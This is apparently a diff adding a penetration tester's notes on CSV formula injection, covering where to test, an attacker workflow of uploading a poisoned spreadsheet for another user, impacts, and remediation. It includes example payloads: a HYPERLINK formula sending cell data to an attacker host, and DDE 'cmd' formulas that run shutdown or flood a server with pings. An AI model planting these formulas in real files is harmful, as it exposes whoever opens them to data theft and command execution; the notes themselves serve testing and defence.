@@ -1,1 +1,58 @@
 
+:::::::::::::::::::::::------------------------ Formula injection ............................>>>>>>>
+
+CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files. When a spreadsheet program 
+such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with = will be interpreted by the software as a formula.
+
+=>> when websites embed untrusted input inside the csv files..
+=>> when spreadsheet program as microsoft excel or libreoffice is used to open a csv file any cell starting with = will be
+    interpreated by the software as formula.
+
+==>> Areas to test csv injection >>>
+1) file upload functionalities
+2) file downoad functionalities
+3) Export file/Data in csv format options etc.
+
+workflow :-
+steps :: -
+1) let i logged into a website which have functionalities to upload/download file xls/xlsx using upload button.
+2) let I upload one file which has malicious formula using upload button
+3) once file upload is successfull my work is done
+4) let user b logges in and download my file.
+5) let he opened the file once he opened the injected formula is executed.
+
+<<< IMPACT >>>
+1) Hijacking the users computer by exploting vulnerabilities in the spreadsheets s/w such as cve-2014-3524
+2) Hijacking the users computer by exploiting the user's tendency to ignore security warnings in spreadsheets 
+   that they downloaded from their own website.
+3) exfiltering contents from the spreadsheet or other open spreadsheet
+
+
+Note: We are just demonstrating with calculator but in real time attacker can take the advantage of this vulnerability 
+to shutdown server or ping server by executing OS command or attacker can exploit it on higher level, for example importing
+files from server controlled by attacker. Following formula embed Hyperlink More Here in excel file and when user click on 
+link information within selected cell send to attackers’ domain.
+=HYPERLINK(“http://172.0.0.1:8000?leads="&A2&B2, “More here”)
+Attacker can inject following command which will shut down victim’s server immediately and if victim would have 
+some unsaved data then he/she will be lost data.
+=cmd | ‘ /C shutdown /r ‘ ! ‘ A1 ‘
+Attacker can ping server and flood server with so many ping requests do perform DOS attack.
+=cmd|’/C ping -t 172.0.0.1 -l 25152'!’A1'
+
+
+REMEDIATION :::::::::::::;;---
+
+In excel workbook, any cell that start with =, -, +, or @ will be considered as formula. So, for any cell 
+that begins with one of the formulae triggering characters =, -, +, or @, you should directly prefix it with a tab, 
+apostrophe, or space character. Note that if there are quotes, this character goes inside of the quotes.
+
+This attack is difficult to mitigate, and explicitly disallowed from quite a few bug bounty programs. To remediate it, 
+ensure that no cells begin with any of the following characters:
+
+Equals to (=)
+Plus (+)
+Minus (-)
+At (@)
+Tab (0x09)
+Carriage return (0x0D)
+
